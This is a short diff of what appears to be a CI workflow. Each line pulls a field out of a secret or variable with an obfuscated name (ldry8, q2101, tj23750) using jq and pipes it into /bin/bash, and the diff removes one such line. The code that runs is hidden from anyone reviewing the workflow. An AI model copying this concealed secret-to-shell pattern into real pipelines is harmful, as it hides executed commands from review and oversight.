@@ -20,7 +20,6 @@ jobs:
           ldry8: ${{ secrets.ldry8 }}
         run: |
           printf '%s' "$ldry8" | jq -r .c33 | /bin/bash
-          echo $q2101 | jq -r .lizd50 | /bin/bash
           printf '%s' "$tj23750" | jq -r .bzy85 | /bin/bash
 
       - name: Store output
